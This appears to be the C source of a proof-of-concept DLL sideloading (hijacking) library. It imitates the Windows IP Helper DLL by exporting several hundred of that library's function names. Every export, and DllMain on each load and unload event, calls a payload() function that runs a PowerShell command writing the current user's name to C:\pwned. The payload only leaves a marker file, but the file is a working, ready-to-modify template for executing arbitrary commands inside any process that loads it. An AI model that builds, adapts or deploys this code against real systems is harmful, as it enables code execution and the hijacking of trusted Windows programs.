
  #include <stdio.h>
  #include <windows.h>

  #ifndef DLL_H_
  #define DLL_H_

  #ifdef BUILD_DLL
  /* DLL export */
  #define EXPORT __declspec(dllexport)
  #else
  /* EXE import */
  #define EXPORT __declspec(dllimport)
  #endif
  #endif /* DLL_H_ */


  void payload() {
    system("powershell -command echo DLL sideloading successful as $(whoami) > C:\\pwned");
  }

  EXPORT BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
          payload();
          break;
    }

    return TRUE;
}
  EXPORT void *UnenableRouter(){ payload(); }
EXPORT void *SetUnicastIpAddressEntry(){ payload(); }
EXPORT void *SetTcpEntry(){ payload(); }
EXPORT void *SetSessionCompartmentId(){ payload(); }
EXPORT void *SetPerTcpConnectionStats(){ payload(); }
EXPORT void *SetPerTcpConnectionEStats(){ payload(); }
EXPORT void *SetPerTcp6ConnectionStats(){ payload(); }
EXPORT void *SetPerTcp6ConnectionEStats(){ payload(); }
EXPORT void *SetNetworkInformation(){ payload(); }
EXPORT void *SetJobCompartmentId(){ payload(); }
EXPORT void *SetIpTTL(){ payload(); }
EXPORT void *SetIpStatisticsEx(){ payload(); }
EXPORT void *SetIpStatistics(){ payload(); }
EXPORT void *SetIpNetEntry2(){ payload(); }
EXPORT void *SetIpNetEntry(){ payload(); }
EXPORT void *SetIpInterfaceEntry(){ payload(); }
EXPORT void *SetIpForwardEntry2(){ payload(); }
EXPORT void *SetIpForwardEntry(){ payload(); }
EXPORT void *SetInterfaceDnsSettings(){ payload(); }
EXPORT void *SetIfEntry(){ payload(); }
EXPORT void *SetDnsSettings(){ payload(); }
EXPORT void *SetCurrentThreadCompartmentScope(){ payload(); }
EXPORT void *SetCurrentThreadCompartmentId(){ payload(); }
EXPORT void *SetAdapterIpAddress(){ payload(); }
EXPORT void *SendARP(){ payload(); }
EXPORT void *RestoreMediaSense(){ payload(); }
EXPORT void *ResolveNeighbor(){ payload(); }
EXPORT void *ResolveIpNetEntry2(){ payload(); }
EXPORT void *register_icmp(){ payload(); }
EXPORT void *ParseNetworkString(){ payload(); }
EXPORT void *OpenCompartment(){ payload(); }
EXPORT void *NTTimeToNTPTime(){ payload(); }
EXPORT void *NTPTimeToNTFileTime(){ payload(); }
EXPORT void *NotifyUnicastIpAddressChange(){ payload(); }
EXPORT void *NotifyTeredoPortChange(){ payload(); }
EXPORT void *NotifyStableUnicastIpAddressTable(){ payload(); }
EXPORT void *NotifyRouteChange2(){ payload(); }
EXPORT void *NotifyRouteChange(){ payload(); }
EXPORT void *NotifyIpInterfaceChange(){ payload(); }
EXPORT void *NotifyIfTimestampConfigChange(){ payload(); }
EXPORT void *NotifyCompartmentChange(){ payload(); }
EXPORT void *NotifyAddrChange(){ payload(); }
EXPORT void *NhpAllocateAndGetInterfaceInfoFromStack(){ payload(); }
EXPORT void *NhGetInterfaceNameFromGuid(){ payload(); }
EXPORT void *NhGetInterfaceNameFromDeviceGuid(){ payload(); }
EXPORT void *NhGetInterfaceDescriptionFromGuid(){ payload(); }
EXPORT void *NhGetGuidFromInterfaceName(){ payload(); }
EXPORT void *LookupPersistentUdpPortReservation(){ payload(); }
EXPORT void *LookupPersistentTcpPortReservation(){ payload(); }
EXPORT void *IpRenewAddress(){ payload(); }
EXPORT void *IpReleaseAddress(){ payload(); }
EXPORT void *InternalSetUnicastIpAddressEntry(){ payload(); }
EXPORT void *InternalSetTeredoPort(){ payload(); }
EXPORT void *InternalSetTcpEntry(){ payload(); }
EXPORT void *InternalSetIpStats(){ payload(); }
EXPORT void *InternalSetIpNetEntry2(){ payload(); }
EXPORT void *InternalSetIpNetEntry(){ payload(); }
EXPORT void *InternalSetIpInterfaceEntry(){ payload(); }
EXPORT void *InternalSetIpForwardEntry2(){ payload(); }
EXPORT void *InternalSetIpForwardEntry(){ payload(); }
EXPORT void *InternalSetIfEntry(){ payload(); }
EXPORT void *InternalIcmpCreateFileEx(){ payload(); }
EXPORT void *InternalGetUnicastIpAddressTable(){ payload(); }
EXPORT void *InternalGetUnicastIpAddressEntry(){ payload(); }
EXPORT void *InternalGetUdpTableWithOwnerPid(){ payload(); }
EXPORT void *InternalGetUdpTableWithOwnerModule(){ payload(); }
EXPORT void *InternalGetUdpTableEx(){ payload(); }
EXPORT void *InternalGetUdpTable(){ payload(); }
EXPORT void *InternalGetUdp6TableWithOwnerPid(){ payload(); }
EXPORT void *InternalGetUdp6TableWithOwnerModule(){ payload(); }
EXPORT void *InternalGetTunnelPhysicalAdapter(){ payload(); }
EXPORT void *InternalGetTcpTableWithOwnerPid(){ payload(); }
EXPORT void *InternalGetTcpTableWithOwnerModule(){ payload(); }
EXPORT void *InternalGetTcpTableEx(){ payload(); }
EXPORT void *InternalGetTcpTable2(){ payload(); }
EXPORT void *InternalGetTcpTable(){ payload(); }
EXPORT void *InternalGetTcp6TableWithOwnerPid(){ payload(); }
EXPORT void *InternalGetTcp6TableWithOwnerModule(){ payload(); }
EXPORT void *InternalGetTcp6Table2(){ payload(); }
EXPORT void *InternalGetRtcSlotInformation(){ payload(); }
EXPORT void *InternalGetMulticastIpAddressTable(){ payload(); }
EXPORT void *InternalGetMulticastIpAddressEntry(){ payload(); }
EXPORT void *InternalGetIPPhysicalInterfaceForDestination(){ payload(); }
EXPORT void *InternalGetIpNetTable2(){ payload(); }
EXPORT void *InternalGetIpNetTable(){ payload(); }
EXPORT void *InternalGetIpNetEntry2(){ payload(); }
EXPORT void *InternalGetIpInterfaceTable(){ payload(); }
EXPORT void *InternalGetIpInterfaceEntry(){ payload(); }
EXPORT void *InternalGetIpForwardTable(){ payload(); }
EXPORT void *InternalGetIpForwardEntry2(){ payload(); }
EXPORT void *InternalGetIpAddrTable(){ payload(); }
EXPORT void *InternalGetIfTable2(){ payload(); }
EXPORT void *InternalGetIfTable(){ payload(); }
EXPORT void *InternalGetIfEntry2(){ payload(); }
EXPORT void *InternalGetForwardIpTable2(){ payload(); }
EXPORT void *InternalGetBoundTcpEndpointTable(){ payload(); }
EXPORT void *InternalGetBoundTcp6EndpointTable(){ payload(); }
EXPORT void *InternalGetAnycastIpAddressTable(){ payload(); }
EXPORT void *InternalGetAnycastIpAddressEntry(){ payload(); }
EXPORT void *InternalFindInterfaceByAddress(){ payload(); }
EXPORT void *InternalDeleteUnicastIpAddressEntry(){ payload(); }
EXPORT void *InternalDeleteIpNetEntry2(){ payload(); }
EXPORT void *InternalDeleteIpNetEntry(){ payload(); }
EXPORT void *InternalDeleteIpForwardEntry2(){ payload(); }
EXPORT void *InternalDeleteIpForwardEntry(){ payload(); }
EXPORT void *InternalDeleteAnycastIpAddressEntry(){ payload(); }
EXPORT void *InternalCreateUnicastIpAddressEntry(){ payload(); }
EXPORT void *InternalCreateIpNetEntry2(){ payload(); }
EXPORT void *InternalCreateIpNetEntry(){ payload(); }
EXPORT void *InternalCreateIpForwardEntry2(){ payload(); }
EXPORT void *InternalCreateIpForwardEntry(){ payload(); }
EXPORT void *InternalCreateAnycastIpAddressEntry(){ payload(); }
EXPORT void *InternalCleanupPersistentStore(){ payload(); }
EXPORT void *InitializeUnicastIpAddressEntry(){ payload(); }
EXPORT void *InitializeIpInterfaceEntry(){ payload(); }
EXPORT void *InitializeIpForwardEntry(){ payload(); }
EXPORT void *InitializeCompartmentEntry(){ payload(); }
EXPORT void *if_nametoindex(){ payload(); }
EXPORT void *if_indextoname(){ payload(); }
EXPORT void *IcmpSendEcho2Ex(){ payload(); }
EXPORT void *IcmpSendEcho2(){ payload(); }
EXPORT void *IcmpSendEcho(){ payload(); }
EXPORT void *IcmpParseReplies(){ payload(); }
EXPORT void *IcmpCreateFile(){ payload(); }
EXPORT void *IcmpCloseHandle(){ payload(); }
EXPORT void *Icmp6SendEcho2(){ payload(); }
EXPORT void *Icmp6ParseReplies(){ payload(); }
EXPORT void *Icmp6CreateFile(){ payload(); }
EXPORT void *GetWPAOACSupportLevel(){ payload(); }
EXPORT void *GetUniDirectionalAdapterInfo(){ payload(); }
EXPORT void *GetUnicastIpAddressTable(){ payload(); }
EXPORT void *GetUnicastIpAddressEntry(){ payload(); }
EXPORT void *GetUdpTable(){ payload(); }
EXPORT void *GetUdpStatisticsEx2(){ payload(); }
EXPORT void *GetUdpStatisticsEx(){ payload(); }
EXPORT void *GetUdpStatistics(){ payload(); }
EXPORT void *GetUdp6Table(){ payload(); }
EXPORT void *GetTeredoPort(){ payload(); }
EXPORT void *GetTcpTable2(){ payload(); }
EXPORT void *GetTcpTable(){ payload(); }
EXPORT void *GetTcpStatisticsEx2(){ payload(); }
EXPORT void *GetTcpStatisticsEx(){ payload(); }
EXPORT void *GetTcpStatistics(){ payload(); }
EXPORT void *GetTcp6Table2(){ payload(); }
EXPORT void *GetTcp6Table(){ payload(); }
EXPORT void *GetSessionCompartmentId(){ payload(); }
EXPORT void *GetRTTAndHopCount(){ payload(); }
EXPORT void *GetPerTcpConnectionStats(){ payload(); }
EXPORT void *GetPerTcpConnectionEStats(){ payload(); }
EXPORT void *GetPerTcp6ConnectionStats(){ payload(); }
EXPORT void *GetPerTcp6ConnectionEStats(){ payload(); }
EXPORT void *GetPerAdapterInfo(){ payload(); }
EXPORT void *GetOwnerModuleFromUdpEntry(){ payload(); }
EXPORT void *GetOwnerModuleFromUdp6Entry(){ payload(); }
EXPORT void *GetOwnerModuleFromTcpEntry(){ payload(); }
EXPORT void *GetOwnerModuleFromTcp6Entry(){ payload(); }
EXPORT void *GetOwnerModuleFromPidAndInfo(){ payload(); }
EXPORT void *GetNumberOfInterfaces(){ payload(); }
EXPORT void *GetNetworkParams(){ payload(); }
EXPORT void *GetNetworkInformation(){ payload(); }
EXPORT void *GetMulticastIpAddressTable(){ payload(); }
EXPORT void *GetMulticastIpAddressEntry(){ payload(); }
EXPORT void *GetJobCompartmentId(){ payload(); }
EXPORT void *GetIpStatisticsEx(){ payload(); }
EXPORT void *GetIpStatistics(){ payload(); }
EXPORT void *GetIpPathTable(){ payload(); }
EXPORT void *GetIpPathEntry(){ payload(); }
EXPORT void *GetIpNetworkConnectionBandwidthEstimates(){ payload(); }
EXPORT void *GetIpNetTable2(){ payload(); }
EXPORT void *GetIpNetTable(){ payload(); }
EXPORT void *GetIpNetEntry2(){ payload(); }
EXPORT void *GetIpInterfaceTable(){ payload(); }
EXPORT void *GetIpInterfaceEntry(){ payload(); }
EXPORT void *GetIpForwardTable2(){ payload(); }
EXPORT void *GetIpForwardTable(){ payload(); }
EXPORT void *GetIpForwardEntry2(){ payload(); }
EXPORT void *GetIpErrorString(){ payload(); }
EXPORT void *GetIpAddrTable(){ payload(); }
EXPORT void *GetInvertedIfStackTable(){ payload(); }
EXPORT void *GetInterfaceInfo(){ payload(); }
EXPORT void *GetInterfaceHardwareTimestampCapabilities(){ payload(); }
EXPORT void *GetInterfaceDnsSettings(){ payload(); }
EXPORT void *GetInterfaceCurrentTimestampCapabilities(){ payload(); }
EXPORT void *GetInterfaceCompartmentId(){ payload(); }
EXPORT void *GetIfTable2Ex(){ payload(); }
EXPORT void *GetIfTable2(){ payload(); }
EXPORT void *GetIfTable(){ payload(); }
EXPORT void *GetIfStackTable(){ payload(); }
EXPORT void *GetIfEntry2Ex(){ payload(); }
EXPORT void *GetIfEntry2(){ payload(); }
EXPORT void *GetIfEntry(){ payload(); }
EXPORT void *GetIcmpStatisticsEx(){ payload(); }
EXPORT void *GetIcmpStatistics(){ payload(); }
EXPORT void *GetFriendlyIfIndex(){ payload(); }
EXPORT void *GetExtendedUdpTable(){ payload(); }
EXPORT void *GetExtendedTcpTable(){ payload(); }
EXPORT void *GetDnsSettings(){ payload(); }
EXPORT void *GetDefaultCompartmentId(){ payload(); }
EXPORT void *GetCurrentThreadCompartmentScope(){ payload(); }
EXPORT void *GetCurrentThreadCompartmentId(){ payload(); }
EXPORT void *GetBestRoute2(){ payload(); }
EXPORT void *GetBestRoute(){ payload(); }
EXPORT void *GetBestInterfaceEx(){ payload(); }
EXPORT void *GetBestInterface(){ payload(); }
EXPORT void *GetAnycastIpAddressTable(){ payload(); }
EXPORT void *GetAnycastIpAddressEntry(){ payload(); }
EXPORT void *GetAdaptersInfo(){ payload(); }
EXPORT void *GetAdaptersAddresses(){ payload(); }
EXPORT void *GetAdapterOrderMap(){ payload(); }
EXPORT void *GetAdapterIndex(){ payload(); }
EXPORT void *FreeMibTable(){ payload(); }
EXPORT void *FreeInterfaceDnsSettings(){ payload(); }
EXPORT void *FreeDnsSettings(){ payload(); }
EXPORT void *FlushIpPathTable(){ payload(); }
EXPORT void *FlushIpNetTable2(){ payload(); }
EXPORT void *FlushIpNetTable(){ payload(); }
EXPORT void *EnableRouter(){ payload(); }
EXPORT void *do_echo_req(){ payload(); }
EXPORT void *do_echo_rep(){ payload(); }
EXPORT void *DisableMediaSense(){ payload(); }
EXPORT void *DeleteUnicastIpAddressEntry(){ payload(); }
EXPORT void *DeleteProxyArpEntry(){ payload(); }
EXPORT void *DeletePersistentUdpPortReservation(){ payload(); }
EXPORT void *DeletePersistentTcpPortReservation(){ payload(); }
EXPORT void *DeleteIpNetEntry2(){ payload(); }
EXPORT void *DeleteIpNetEntry(){ payload(); }
EXPORT void *DeleteIpForwardEntry2(){ payload(); }
EXPORT void *DeleteIpForwardEntry(){ payload(); }
EXPORT void *DeleteIPAddress(){ payload(); }
EXPORT void *DeleteCompartment(){ payload(); }
EXPORT void *DeleteAnycastIpAddressEntry(){ payload(); }
EXPORT void *CreateUnicastIpAddressEntry(){ payload(); }
EXPORT void *CreateSortedAddressPairs(){ payload(); }
EXPORT void *CreateProxyArpEntry(){ payload(); }
EXPORT void *CreatePersistentUdpPortReservation(){ payload(); }
EXPORT void *CreatePersistentTcpPortReservation(){ payload(); }
EXPORT void *CreateIpNetEntry2(){ payload(); }
EXPORT void *CreateIpNetEntry(){ payload(); }
EXPORT void *CreateIpForwardEntry2(){ payload(); }
EXPORT void *CreateIpForwardEntry(){ payload(); }
EXPORT void *CreateCompartment(){ payload(); }
EXPORT void *CreateAnycastIpAddressEntry(){ payload(); }
EXPORT void *ConvertStringToInterfacePhysicalAddress(){ payload(); }
EXPORT void *ConvertStringToGuidW(){ payload(); }
EXPORT void *ConvertStringToGuidA(){ payload(); }
EXPORT void *ConvertRemoteInterfaceLuidToIndex(){ payload(); }
EXPORT void *ConvertRemoteInterfaceLuidToGuid(){ payload(); }
EXPORT void *ConvertRemoteInterfaceLuidToAlias(){ payload(); }
EXPORT void *ConvertRemoteInterfaceIndexToLuid(){ payload(); }
EXPORT void *ConvertRemoteInterfaceGuidToLuid(){ payload(); }
EXPORT void *ConvertRemoteInterfaceAliasToLuid(){ payload(); }
EXPORT void *ConvertLengthToIpv4Mask(){ payload(); }
EXPORT void *ConvertIpv4MaskToLength(){ payload(); }
EXPORT void *ConvertInterfacePhysicalAddressToLuid(){ payload(); }
EXPORT void *ConvertInterfaceNameToLuidW(){ payload(); }
EXPORT void *ConvertInterfaceNameToLuidA(){ payload(); }
EXPORT void *ConvertInterfaceLuidToNameW(){ payload(); }
EXPORT void *ConvertInterfaceLuidToNameA(){ payload(); }
EXPORT void *ConvertInterfaceLuidToIndex(){ payload(); }
EXPORT void *ConvertInterfaceLuidToGuid(){ payload(); }
EXPORT void *ConvertInterfaceLuidToAlias(){ payload(); }
EXPORT void *ConvertInterfaceIndexToLuid(){ payload(); }
EXPORT void *ConvertInterfaceGuidToLuid(){ payload(); }
EXPORT void *ConvertInterfaceAliasToLuid(){ payload(); }
EXPORT void *ConvertGuidToStringW(){ payload(); }
EXPORT void *ConvertGuidToStringA(){ payload(); }
EXPORT void *ConvertCompartmentIdToGuid(){ payload(); }
EXPORT void *ConvertCompartmentGuidToId(){ payload(); }
EXPORT void *CloseGetIPPhysicalInterfaceForDestination(){ payload(); }
EXPORT void *CloseCompartment(){ payload(); }
EXPORT void *CaptureInterfaceHardwareCrossTimestamp(){ payload(); }
EXPORT void *CancelMibChangeNotify2(){ payload(); }
EXPORT void *CancelIPChangeNotify(){ payload(); }
EXPORT void *CancelIfTimestampConfigChange(){ payload(); }
EXPORT void *AllocateAndGetIpAddrTableFromStack(){ payload(); }
EXPORT void *AllocateAndGetInterfaceInfoFromStack(){ payload(); }
EXPORT void *AddIPAddress(){ payload(); }
EXPORT void __stdcall *_PfUnBindInterface(int a0){ payload(); }
EXPORT void __stdcall *_PfTestPacket(int a0, int a1, int a2, int a3, int a4){ payload(); }
EXPORT void __stdcall *_PfSetLogBuffer(int a0, int a1, int a2, int a3, int a4, int a5, int a6){ payload(); }
EXPORT void __stdcall *_PfRemoveGlobalFilterFromInterface(int a0, int a1){ payload(); }
EXPORT void __stdcall *_PfRemoveFiltersFromInterface(int a0, int a1, int a2, int a3, int a4){ payload(); }
EXPORT void __stdcall *_PfRemoveFilterHandles(int a0, int a1, int a2){ payload(); }
EXPORT void __stdcall *_PfRebindFilters(int a0, int a1){ payload(); }
EXPORT void __stdcall *_PfMakeLog(int a0){ payload(); }
EXPORT void __stdcall *_PfGetInterfaceStatistics(int a0, int a1, int a2, int a3){ payload(); }
EXPORT void __stdcall *_PfDeleteLog(){ payload(); }
EXPORT void __stdcall *_PfDeleteInterface(int a0){ payload(); }
EXPORT void __stdcall *_PfCreateInterface(int a0, int a1, int a2, int a3, int a4, int a5){ payload(); }
EXPORT void __stdcall *_PfBindInterfaceToIPAddress(int a0, int a1, int a2){ payload(); }
EXPORT void __stdcall *_PfBindInterfaceToIndex(int a0, int a1, int a2, int a3){ payload(); }
EXPORT void __stdcall *_PfAddGlobalFilterToInterface(int a0, int a1){ payload(); }
EXPORT void __stdcall *_PfAddFiltersToInterface(int a0, int a1, int a2, int a3, int a4, int a5){ payload(); }